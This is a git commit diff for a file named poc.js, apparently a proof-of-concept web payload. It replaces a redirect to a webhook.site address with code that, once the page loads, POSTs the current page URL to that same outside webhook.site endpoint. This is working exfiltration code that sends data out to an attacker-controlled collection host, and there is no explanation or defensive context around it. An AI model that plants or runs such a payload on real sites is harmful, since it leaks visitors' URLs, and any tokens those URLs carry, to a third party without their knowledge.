53f7de985a912943d1127d062793050233b695c3
RE <turbine@UnknownHardware.localdomain>
2023-02-08 12:05:49 -0500

    Initial Commit

--- poc.js
+++ poc.js
@@ -1,1 +1,11 @@
-window.location.replace("https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8");
+window.onload = function() {
+  fetch('https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      url: window.location.href
+    })
+  });
+};
